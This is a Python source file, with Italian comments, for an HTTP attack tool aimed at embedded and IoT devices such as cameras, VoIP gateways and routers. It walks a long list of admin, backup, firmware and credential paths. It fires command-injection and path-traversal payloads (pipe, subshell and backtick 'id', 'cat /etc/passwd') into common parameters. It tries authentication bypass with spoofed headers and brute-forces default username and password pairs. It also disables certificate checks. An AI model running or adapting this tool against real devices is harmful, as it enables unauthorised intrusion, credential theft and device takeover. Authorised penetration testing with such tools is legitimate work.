#!/usr/bin/env python3
"""
http_iot_fuzz.py — HTTP Fuzzer for Embedded/IoT Devices
Uso: python3 http_iot_fuzz.py <target> [--port 80] [--scheme http|https] [--mode paths|inject|bypass|all]
"""

import argparse
import urllib.request
import urllib.error
import urllib.parse
import ssl
import sys
import re

TIMEOUT = 3

CGI_PATHS = [
    # Admin / login
    "/cgi-bin/admin.cgi", "/cgi-bin/login.cgi", "/cgi-bin/main.cgi",
    "/admin/", "/admin/index.html", "/admin.html", "/administration/",
    "/manager/", "/manage/", "/setup/", "/config/",
    # VoIP/SIP
    "/cgi-bin/webadmin.cgi", "/cgi-bin/voip.cgi", "/cgi-bin/sip.cgi",
    "/cgi-bin/gateway.cgi", "/cgi-bin/pbx.cgi", "/cgi-bin/network.cgi",
    "/cgi-bin/system.cgi",
    # IP Camera
    "/cgi-bin/snapshot.cgi", "/cgi-bin/video.cgi", "/cgi-bin/stream.cgi",
    "/stream", "/snapshot.jpg", "/mjpeg", "/video.cgi",
    "/cgi-bin/hi3510/param.cgi", "/cgi-bin/hi3510/snap.cgi",
    # Config/backup
    "/config.bin", "/config.cfg", "/config.xml", "/config.tar.gz",
    "/backup.bin", "/backup.cfg", "/backup/", "/getconfig",
    "/cgi-bin/config.cgi", "/cgi-bin/backup.cgi", "/cgi-bin/export.cgi",
    # Firmware
    "/cgi-bin/upgrade.cgi", "/firmware.bin", "/update", "/upgrade",
    "/cgi-bin/firmware.cgi", "/flash", "/flashimage",
    # Info/status
    "/cgi-bin/info.cgi", "/status", "/status.xml", "/info.xml",
    "/cgi-bin/status.cgi", "/system_info", "/devinfo",
    # Debug
    "/cgi-bin/ping.cgi", "/cgi-bin/traceroute.cgi", "/cgi-bin/exec.cgi",
    "/cgi-bin/cmd.cgi", "/cgi-bin/run.cgi", "/cgi-bin/debug.cgi",
    # Common embedded
    "/index.cgi", "/home.cgi", "/main.cgi",
    "/setup.html", "/advanced.html", "/wizard.html",
    # Extra IoT
    "/cgi-bin/user.cgi", "/cgi-bin/param.cgi", "/cgi-bin/reboot.cgi",
    "/api/", "/api/v1/", "/api/info", "/api/config",
    "/system.conf", "/etc/passwd",
    "/cgi-bin/log.cgi", "/logs/", "/log.txt",
    "/Forms/login", "/Forms/config",
    "/onvif/device_service", "/onvif-http/snapshot",
    "/SDK/webLanguage",
    "/axis-cgi/admin/pwdgrp.cgi",
    "/VAPIX/basicdeviceinfo.cgi",
    "/current_config/credentials",
    "/cam/realmonitor",
]

INJECT_PAYLOADS = [
    ("|id", "pipe injection"),
    (";id", "semicolon injection"),
    ("$(id)", "subshell injection"),
    ("&&id", "and injection"),
    ("`id`", "backtick injection"),
    ("%0aid", "newline injection"),
    ("|cat /etc/passwd", "pipe LFI"),
    (";cat /etc/passwd", "semi LFI"),
    ("../../etc/passwd", "path traversal"),
    ("../../../etc/passwd", "path traversal deep"),
]

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Original-URL": "/admin/"},
    {"X-Rewrite-URL": "/admin/"},
    {"Forwarded": "for=127.0.0.1"},
    {"Content-Length": "0"},
    {"X-HTTP-Method-Override": "GET"},
]

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", ""), ("admin", "1234"), ("admin", "12345"),
    ("admin", "password"), ("root", "root"), ("root", "admin"),
    ("admin", "Admin1234"), ("operator", "operator"), ("user", "user"),
    ("admin", "admin123"), ("admin", "0000"), ("admin", "888888"),
    ("admin", "666666"), ("admin", "9999"),
]

def make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def fetch(url, method="GET", headers=None, data=None, timeout=TIMEOUT, allow_redirects=True):
    if headers is None:
        headers = {}
    headers.setdefault('User-Agent', 'exa-dune-http-iot-fuzz/1.0')
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    ctx = make_ssl_ctx()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(4096).decode(errors='replace')
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(2048).decode(errors='replace')
        except Exception:
            body = ""
        return e.code, body, {}
    except Exception:
        return None, None, {}

def mode_paths(base_url):
    """Fuzz CGI paths comuni"""
    found = []
    print(f"[*] Path fuzzing: {len(CGI_PATHS)} paths su {base_url}")
    for path in CGI_PATHS:
        url = base_url + path
        status, body, headers = fetch(url)
        if status and status not in (404, 400):
            severity = "HIGH" if status in (200,) else "MEDIUM" if status in (301, 302, 403) else "INFO"
            print(f"[FOUND:{severity}]  {status} — {path}")
            found.append((path, status, body))
    return found

def mode_inject(base_url, found_paths):
    """Injection su path trovati con parametri"""
    print(f"\n[*] Injection test su {len(found_paths)} path trovati")
    for path, status, body in found_paths:
        # Cerca parametri GET nell'URL o nel body
        params_to_test = ["cmd", "exec", "run", "command", "ping", "host", "url",
                          "file", "path", "page", "ip", "name", "input"]
        for param in params_to_test:
            for payload, desc in INJECT_PAYLOADS:
                url = base_url + path + f"?{param}={urllib.parse.quote(payload)}"
                status2, body2, _ = fetch(url)
                if body2 and any(k in body2 for k in ['uid=', 'gid=', 'root:', 'bin/sh',
                                                        '/etc/passwd', 'www-data']):
                    print(f"[FOUND:CRITICAL] Command injection: {path}?{param}={payload} — {desc}")
                    return

def mode_bypass(base_url, auth_paths=None):
    """Auth bypass via header manipulation"""
    print(f"\n[*] Auth bypass test")
    test_paths = auth_paths or ["/admin/", "/config/", "/cgi-bin/admin.cgi", "/setup/"]
    for path in test_paths:
        url = base_url + path
        # Prima senza bypass
        status_base, _, _ = fetch(url)
        if status_base in (401, 403):
            print(f"    {path} — base: {status_base} (protetto)")
            for hdrs in BYPASS_HEADERS:
                status2, body2, _ = fetch(url, headers=hdrs)
                if status2 == 200 and body2:
                    hdr_str = ", ".join(f"{k}: {v}" for k, v in hdrs.items())
                    print(f"[FOUND:HIGH]  Auth bypass con header '{hdr_str}' su {path}")

def mode_auth(base_url):
    """Test HTTP Basic auth con default credentials IoT"""
    print(f"\n[*] HTTP Basic auth default credentials test")
    import base64
    test_paths = ["/", "/admin/", "/cgi-bin/admin.cgi", "/config/", "/setup/"]
    for path in test_paths:
        url = base_url + path
        for user, passwd in DEFAULT_CREDS:
            creds = base64.b64encode(f"{user}:{passwd}".encode()).decode()
            status, body, _ = fetch(url, headers={"Authorization": f"Basic {creds}"})
            if status == 200 and body:
                if any(k in body.lower() for k in ['logout', 'dashboard', 'welcome',
                                                     'admin', 'configuration', 'settings']):
                    if not any(k in body.lower() for k in ['login', 'invalid', 'error']):
                        print(f"[FOUND:CRITICAL] Default creds valide: {user}:{passwd} su {path}")
                        return

def main():
    parser = argparse.ArgumentParser(description="HTTP Fuzzer for Embedded/IoT Devices")
    parser.add_argument("target", help="Target IP/hostname")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--scheme", choices=["http", "https"], default="http")
    parser.add_argument("--mode", choices=["paths", "inject", "bypass", "auth", "all"],
                        default="all")
    args = parser.parse_args()

    base_url = f"{args.scheme}://{args.target}:{args.port}"
    print(f"[*] HTTP IoT Fuzz — {base_url} | Mode: {args.mode}")

    found_paths = []
    if args.mode in ("paths", "all"):
        found_paths = mode_paths(base_url)
        print(f"\n[*] Path trovati: {len(found_paths)}")

    if args.mode in ("inject", "all"):
        if not found_paths:
            found_paths = [(p, 200, "") for p in ["/cgi-bin/ping.cgi", "/cgi-bin/cmd.cgi"]]
        mode_inject(base_url, found_paths)

    auth_protected = [(p, s, b) for p, s, b in found_paths if s in (401, 403)]
    if args.mode in ("bypass", "all"):
        mode_bypass(base_url, [p for p, s, b in auth_protected])

    if args.mode in ("auth", "all"):
        mode_auth(base_url)

    print(f"\n[*] HTTP IoT Fuzz completato.")

if __name__ == "__main__":
    main()
